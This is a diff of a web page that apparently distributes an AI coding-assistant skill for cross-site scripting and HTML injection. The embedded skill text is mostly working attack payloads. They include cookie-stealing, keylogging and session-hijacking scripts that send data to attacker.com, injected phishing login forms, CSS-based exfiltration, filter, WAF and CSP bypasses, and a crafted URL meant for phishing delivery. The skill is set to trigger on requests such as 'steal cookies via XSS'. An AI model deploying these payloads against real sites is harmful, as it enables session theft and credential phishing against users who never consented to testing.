@@ -4,63 +4,113 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>xss-html-injection - AICCLI</title>
-  <meta name="description" content="xss-html-injection - Claude Code skill for AICCLI">
+  <meta name="description" content="This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploi">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg-dark: #0a0a0f;
-      --glass-bg: rgba(255, 255, 255, 0.03);
-      --glass-border: rgba(255, 255, 255, 0.08);
-      --text-primary: #ffffff;
-      --text-secondary: #a0a0b0;
-      --text-muted: #606070;
-      --accent: #a855f7;
-      --accent-glow: rgba(168, 85, 247, 0.3);
-      --cyan: #22d3ee;
-    }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Space Grotesk', sans-serif; background: var(--bg-dark); color: var(--text-primary); min-height: 100vh; }
-    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at 20% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 50%), radial-gradient(ellipse at 80% 80%, rgba(34, 211, 238, 0.1) 0%, transparent 50%); pointer-events: none; z-index: -1; }
-    header { position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px); border-bottom: 1px solid var(--glass-border); background: rgba(10, 10, 15, 0.8); }
-    .header-content { max-width: 1400px; margin: 0 auto; padding: 16px 20px; display: flex; align-items: center; gap: 20px; }
-    .logo-link { display: flex; align-items: center; gap: 12px; text-decoration: none; }
-    .logo { width: 40px; height: 40px; border-radius: 10px; border: 2px solid var(--accent); }
-    .brand { font-size: 24px; font-weight: 700; color: var(--accent); letter-spacing: -1px; }
-    .breadcrumb { margin-left: auto; color: var(--text-secondary); font-size: 14px; }
-    .breadcrumb a { color: var(--text-secondary); text-decoration: none; }
-    .breadcrumb a:hover { color: var(--accent); }
-    .container { max-width: 1400px; margin: 0 auto; padding: 40px 20px; }
-    .card { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: 20px; padding: 32px; backdrop-filter: blur(20px); margin-bottom: 30px; }
-    h1 { font-size: 36px; margin-bottom: 16px; letter-spacing: -1px; background: linear-gradient(135deg, var(--accent), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .meta { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
-    .meta-item { padding: 8px 16px; background: rgba(168, 85, 247, 0.15); border: 1px solid var(--accent); border-radius: 20px; font-size: 13px; color: var(--accent); }
-    .content-section h2 { font-size: 20px; margin: 24px 0 16px; color: var(--text-primary); }
-    pre { background: rgba(0, 0, 0, 0.4); border: 1px solid var(--glass-border); border-radius: 16px; padding: 24px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 14px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; }
-    code { background: rgba(168, 85, 247, 0.15); padding: 2px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; color: var(--cyan); }
-    .description { font-size: 16px; color: var(--text-secondary); line-height: 1.7; margin-bottom: 24px; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',sans-serif;background:#fafafa;color:#1a1a1a;line-height:1.6}
+    .container{max-width:900px;margin:0 auto;padding:0 24px}
+    header{background:#fff;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:100;padding:12px 0}
+    header .container{display:flex;align-items:center;justify-content:space-between}
+    .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+    .logo img{width:32px;height:32px;border-radius:6px}
+    .logo span{font-size:18px;font-weight:700;color:#1a1a1a}
+    .nav{display:flex;gap:8px}
+    .nav a{padding:8px 16px;border-radius:6px;text-decoration:none;color:#666;font-size:14px;font-weight:500;transition:all .2s}
+    .nav a:hover{background:#f5f5f5;color:#1a1a1a}
+    .breadcrumb{padding:24px 0 0;font-size:14px;color:#888}
+    .breadcrumb a{color:#666;text-decoration:none}
+    .breadcrumb a:hover{color:#1a1a1a}
+    .content{padding:32px 0 64px}
+    .header{display:flex;align-items:flex-start;gap:20px;margin-bottom:32px}
+    .icon{width:64px;height:64px;background:#f5f5f5;border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}
+    .title{flex:1}
+    .title h1{font-size:32px;font-weight:700;margin-bottom:8px}
+    .title .meta{display:flex;gap:12px;flex-wrap:wrap}
+    .badge{padding:6px 12px;background:#f5f5f5;border-radius:6px;font-size:13px;color:#666}
+    .badge.type{background:#e8f4ff;color:#0066cc}
+    .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
+    .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
+    .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
+    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
+    .copy-btn:hover{background:#f5f5f5}
+    pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
+    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
+    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
+    .how-to ol{margin:16px 0;padding-left:24px}
+    .how-to li{margin-bottom:12px;color:#444}
+    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
+    .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+    .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
+    .stats{display:flex;gap:24px;margin-top:20px;padding-top:20px;border-top:1px solid #e5e5e5}
+    .stat{text-align:center}
+    .stat strong{display:block;font-size:24px;font-weight:600;color:#1a1a1a}
+    .stat span{font-size:12px;color:#888}
+    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
   </style>
 </head>
 <body>
   <header>
-    <div class="header-content">
-      <a href="../index.html" class="logo-link"><img src="../logo.png" alt="AICCLI" class="logo"><span class="brand">AICCLI</span></a>
-      <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../skill.html">Skill</a> / xss-html-injection</div>
+    <div class="container">
+      <a href="index.html" class="logo"><img src="logo.png" alt="AICCLI"><span>AICCLI</span></a>
+      <nav class="nav">
+        <a href="index.html">Components</a>
+        <a href="docs.html">Docs</a>
+        <a href="install.html">Install</a>
+      </nav>
     </div>
   </header>
+
   <div class="container">
-    <div class="card">
-      <h1>xss-html-injection</h1>
-      <div class="meta">
-        <span class="meta-item">Skill</span>
-        <span class="meta-item">security</span>
+    <div class="breadcrumb">
+      <a href="index.html">Home</a> / <a href="index.html">skills</a> / security / xss-html-injection
+    </div>
+  </div>
+
+  <main class="container content">
+    <div class="header">
+      <div class="icon">⚡</div>
+      <div class="title">
+        <h1>xss-html-injection</h1>
+        <div class="meta">
+          <span class="badge type">Skill</span>
+          <span class="badge">security</span>
+          
+        </div>
       </div>
-      <div class="description"><pre>---
+    </div>
+
+    <p class="desc">This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploit client-side injection vulnerabilities", "steal cookies via XSS", or "bypass content security policies". It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.</p>
+
+    <div class="section">
+      <h2>How to Use</h2>
+      <div class="how-to">
+        <ol>
+          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/xss-html-injection</code> in your terminal</li>
+          <li><strong>Or with OpenCode:</strong> Run <code>opencode install skills/xss-html-injection</code></li>
+          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
+        </ol>
+        
+        <div class="install-box">
+          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+          <p>Installation Command:</p>
+          <code id="install-cmd">npx aiccli install skills/xss-html-injection</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Configuration</h2>
+      <pre id="config"><code>---
 name: Cross-Site Scripting and HTML Injection Testing
-description: This skill should be used when the user asks to "test for XSS vulnerabilities", "perform cross-site scripting attacks", "identify HTML injection flaws", "exploit client-side injection vulnerabilities", "steal cookies via XSS", or "bypass content security policies". It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.
+description: This skill should be used when the user asks to &quot;test for XSS vulnerabilities&quot;, &quot;perform cross-site scripting attacks&quot;, &quot;identify HTML injection flaws&quot;, &quot;exploit client-side injection vulnerabilities&quot;, &quot;steal cookies via XSS&quot;, or &quot;bypass content security policies&quot;. It provides comprehensive techniques for detecting, exploiting, and understanding XSS and HTML injection attack vectors in web applications.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: &quot;1.1&quot;
 ---
 
 # Cross-Site Scripting and HTML Injection Testing
@@ -122,16 +172,16 @@ Insert test strings to observe application behavior:
 &lt;test123&gt;
 
 &lt;!-- Script tag test --&gt;
-&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
 
 &lt;!-- Event handler test --&gt;
-&lt;img src=x onerror=alert('XSS')&gt;
+&lt;img src=x onerror=alert(&#039;XSS&#039;)&gt;
 
 &lt;!-- SVG-based test --&gt;
-&lt;svg onload=alert('XSS')&gt;
+&lt;svg onload=alert(&#039;XSS&#039;)&gt;
 
 &lt;!-- Body event test --&gt;
-&lt;body onload=alert('XSS')&gt;
+&lt;body onload=alert(&#039;XSS&#039;)&gt;
 ```
 
 Monitor for:
@@ -154,7 +204,7 @@ Monitor for:
 
 **DOM-Based XSS Indicators:**
 - Input processed by client-side JavaScript
-- Server response doesn't contain payload
+- Server response doesn&#039;t contain payload
 - Exploitation occurs entirely in browser
 
 ### Phase 2: Stored XSS Exploitation
@@ -176,31 +226,31 @@ Target areas with persistent user content:
 ```html
 &lt;!-- Cookie stealing payload --&gt;
 &lt;script&gt;
-document.location='http://attacker.com/steal?c='+document.cookie
+document.location=&#039;http://attacker.com/steal?c=&#039;+document.cookie
 &lt;/script&gt;
 
 &lt;!-- Keylogger injection --&gt;
 &lt;script&gt;
 document.onkeypress=function(e){
-  new Image().src='http://attacker.com/log?k='+e.key;
+  new Image().src=&#039;http://attacker.com/log?k=&#039;+e.key;
 }
 &lt;/script&gt;
 
 &lt;!-- Session hijacking --&gt;
 &lt;script&gt;
-fetch('http://attacker.com/capture',{
-  method:'POST',
+fetch(&#039;http://attacker.com/capture&#039;,{
+  method:&#039;POST&#039;,
   body:JSON.stringify({cookies:document.cookie,url:location.href})
 })
 &lt;/script&gt;
 
 &lt;!-- Phishing form injection --&gt;
-&lt;div id="login"&gt;
+&lt;div id=&quot;login&quot;&gt;
 &lt;h2&gt;Session Expired - Please Login&lt;/h2&gt;
-&lt;form action="http://attacker.com/phish" method="POST"&gt;
-Username: &lt;input name="user"&gt;&lt;br&gt;
-Password: &lt;input type="password" name="pass"&gt;&lt;br&gt;
-&lt;input type="submit" value="Login"&gt;
+&lt;form action=&quot;http://attacker.com/phish&quot; method=&quot;POST&quot;&gt;
+Username: &lt;input name=&quot;user&quot;&gt;&lt;br&gt;
+Password: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
 &lt;/form&gt;
 &lt;/div&gt;
 ```
@@ -218,7 +268,7 @@ https://target.com/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
 https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
 
 # Event handler in parameter
-https://target.com/page?name="&gt;&lt;img src=x onerror=alert(1)&gt;
+https://target.com/page?name=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;
 
 # Fragment-based (for DOM XSS)
 https://target.com/page#&lt;script&gt;alert(1)&lt;/script&gt;
@@ -282,9 +332,9 @@ https://target.com/page?default=&lt;script&gt;alert(1)&lt;/script&gt;
 
 // PostMessage exploitation
 // On attacker page:
-&lt;iframe src="https://target.com/vulnerable"&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;https://target.com/vulnerable&quot;&gt;&lt;/iframe&gt;
 &lt;script&gt;
-frames[0].postMessage('&lt;img src=x onerror=alert(1)&gt;','*');
+frames[0].postMessage(&#039;&lt;img src=x onerror=alert(1)&gt;&#039;,&#039;*&#039;);
 &lt;/script&gt;
 ```
 
@@ -298,19 +348,19 @@ Modify page appearance without JavaScript:
 &lt;h1&gt;SITE HACKED&lt;/h1&gt;
 
 &lt;!-- Form hijacking --&gt;
-&lt;form action="http://attacker.com/capture"&gt;
-&lt;input name="credentials" placeholder="Enter password"&gt;
+&lt;form action=&quot;http://attacker.com/capture&quot;&gt;
+&lt;input name=&quot;credentials&quot; placeholder=&quot;Enter password&quot;&gt;
 &lt;button&gt;Submit&lt;/button&gt;
 &lt;/form&gt;
 
 &lt;!-- CSS injection for data exfiltration --&gt;
 &lt;style&gt;
-input[value^="a"]{background:url(http://attacker.com/a)}
-input[value^="b"]{background:url(http://attacker.com/b)}
+input[value^=&quot;a&quot;]{background:url(http://attacker.com/a)}
+input[value^=&quot;b&quot;]{background:url(http://attacker.com/b)}
 &lt;/style&gt;
 
 &lt;!-- iframe injection --&gt;
-&lt;iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;http://attacker.com/phishing&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;&gt;&lt;/iframe&gt;
 ```
 
 #### Stored HTML Injection
@@ -324,7 +374,7 @@ Persistent content manipulation:
 &lt;style&gt;body{background:red !important;}&lt;/style&gt;
 
 &lt;!-- Hidden content with CSS --&gt;
-&lt;div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;"&gt;
+&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;&quot;&gt;
 Fake login form or misleading content here
 &lt;/div&gt;
 ```
@@ -348,17 +398,17 @@ Fake login form or misleading content here
 
 &lt;!-- Malformed tags --&gt;
 &lt;img src=x onerror=alert(1)//
-&lt;img """&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;img &quot;&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
 ```
 
 #### Encoding Bypass
 
 ```html
 &lt;!-- HTML entity encoding --&gt;
-&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;
 
 &lt;!-- Hex encoding --&gt;
-&lt;img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)&gt;
+&lt;img src=x onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)&gt;
 
 &lt;!-- Unicode encoding --&gt;
 &lt;script&gt;\u0061lert(1)&lt;/script&gt;
@@ -371,16 +421,16 @@ Fake login form or misleading content here
 
 ```javascript
 // String concatenation
-&lt;script&gt;eval('al'+'ert(1)')&lt;/script&gt;
+&lt;script&gt;eval(&#039;al&#039;+&#039;ert(1)&#039;)&lt;/script&gt;
 
 // Template literals
 &lt;script&gt;alert`1`&lt;/script&gt;
 
 // Constructor execution
-&lt;script&gt;[].constructor.constructor('alert(1)')()&lt;/script&gt;
+&lt;script&gt;[].constructor.constructor(&#039;alert(1)&#039;)()&lt;/script&gt;
 
 // Base64 encoding
-&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+&lt;script&gt;eval(atob(&#039;YWxlcnQoMSk=&#039;))&lt;/script&gt;
 
 // Without parentheses
 &lt;script&gt;alert`1`&lt;/script&gt;
@@ -398,7 +448,7 @@ Fake login form or misleading content here
 &lt;script&gt;/**/alert(1)/**/&lt;/script&gt;
 
 &lt;!-- HTML comments in attributes --&gt;
-&lt;img src=x onerror="alert(1)"&lt;!--comment--&gt;
+&lt;img src=x onerror=&quot;alert(1)&quot;&lt;!--comment--&gt;
 ```
 
 ## Quick Reference
@@ -407,7 +457,7 @@ Fake login form or misleading content here
 ```
 1. Insert &lt;script&gt;alert(1)&lt;/script&gt; → Check execution
 2. Insert &lt;img src=x onerror=alert(1)&gt; → Check event handler
-3. Insert "&gt;&lt;script&gt;alert(1)&lt;/script&gt; → Test attribute escape
+3. Insert &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; → Test attribute escape
 4. Insert javascript:alert(1) → Test href/src attributes
 5. Check URL hash handling → DOM XSS potential
 ```
@@ -417,8 +467,8 @@ Fake login form or misleading content here
 | Context | Payload |
 |---------|---------|
 | HTML body | `&lt;script&gt;alert(1)&lt;/script&gt;` |
-| HTML attribute | `"&gt;&lt;script&gt;alert(1)&lt;/script&gt;` |
-| JavaScript string | `';alert(1)//` |
+| HTML attribute | `&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;` |
+| JavaScript string | `&#039;;alert(1)//` |
 | JavaScript template | `${alert(1)}` |
 | URL attribute | `javascript:alert(1)` |
 | CSS context | `&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;` |
@@ -427,16 +477,16 @@ Fake login form or misleading content here
 ### Cookie Theft Payload
 ```javascript
 &lt;script&gt;
-new Image().src='http://attacker.com/c='+btoa(document.cookie);
+new Image().src=&#039;http://attacker.com/c=&#039;+btoa(document.cookie);
 &lt;/script&gt;
 ```
 
 ### Session Hijacking Template
 ```javascript
 &lt;script&gt;
-fetch('https://attacker.com/log',{
-  method:'POST',
-  mode:'no-cors',
+fetch(&#039;https://attacker.com/log&#039;,{
+  method:&#039;POST&#039;,
+  mode:&#039;no-cors&#039;,
   body:JSON.stringify({
     cookies:document.cookie,
     localStorage:JSON.stringify(localStorage),
@@ -477,7 +527,7 @@ fetch('https://attacker.com/log',{
 POST /api/comments
 Content-Type: application/json
 
-{"body": "&lt;script&gt;alert('XSS')&lt;/script&gt;", "postId": 123}
+{&quot;body&quot;: &quot;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&quot;, &quot;postId&quot;: 123}
 ```
 
 **Observation**: Comment renders and script executes for all viewers
@@ -486,11 +536,11 @@ Content-Type: application/json
 ```html
 &lt;script&gt;
 var i = new Image();
-i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+i.src = &#039;https://attacker.com/steal?cookie=&#039; + encodeURIComponent(document.cookie);
 &lt;/script&gt;
 ```
 
-**Result**: Every user viewing the comment has their session cookie sent to attacker's server.
+**Result**: Every user viewing the comment has their session cookie sent to attacker&#039;s server.
 
 ### Example 2: Reflected XSS via Search Parameter
 
@@ -508,7 +558,7 @@ https://shop.example.com/search?q=&lt;script&gt;alert(document.domain)&lt;/scrip
 
 **Crafted Attack URL**:
 ```
-https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
+https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch(&#039;https://attacker.com/log?c=&#039;+document.cookie)%22%3E
 ```
 
 **Delivery**: URL sent via phishing email to target user.
@@ -519,7 +569,7 @@ https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://att
 
 **Vulnerable Code**:
 ```javascript
-document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
+document.getElementById(&#039;welcome&#039;).innerHTML = &#039;Hello, &#039; + location.hash.slice(1);
 ```
 
 **Attack URL**:
@@ -535,12 +585,12 @@ https://app.example.com/dashboard#&lt;img src=x onerror=alert(document.cookie)&g
 
 **CSP Header**:
 ```
-Content-Security-Policy: script-src 'self' https://cdn.trusted.com
+Content-Security-Policy: script-src &#039;self&#039; https://cdn.trusted.com
 ```
 
 **Bypass**: Find JSONP endpoint on trusted domain:
 ```html
-&lt;script src="https://cdn.trusted.com/api/jsonp?callback=alert"&gt;&lt;/script&gt;
+&lt;script src=&quot;https://cdn.trusted.com/api/jsonp?callback=alert&quot;&gt;&lt;/script&gt;
 ```
 
 **Result**: CSP bypassed using allowed script source.
@@ -550,12 +600,43 @@ Content-Security-Policy: script-src 'self' https://cdn.trusted.com
 | Issue | Solutions |
 |-------|-----------|
 | Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
-| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
+| Payload appears but doesn&#039;t execute | Break out of attribute context with `&quot;` or `&#039;`; check if inside comment; test different contexts |
 | Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
 | CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
 | WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
-</pre></div>
+</code></pre>
     </div>
-  </div>
+
+    
+
+    <div class="section">
+      <h2>Info</h2>
+      <div class="stats">
+        <div class="stat">
+          <strong>111</strong>
+          <span>Downloads</span>
+        </div>
+        <div class="stat">
+          <strong>1.0</strong>
+          <span>Version</span>
+        </div>
+        <div class="stat">
+          <strong>MIT</strong>
+          <span>License</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function copyConfig() {
+      const config = document.getElementById('config').textContent;
+      navigator.clipboard.writeText(config).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy Config', 2000);
+      });
+    }
+  </script>
 </body>
 </html>
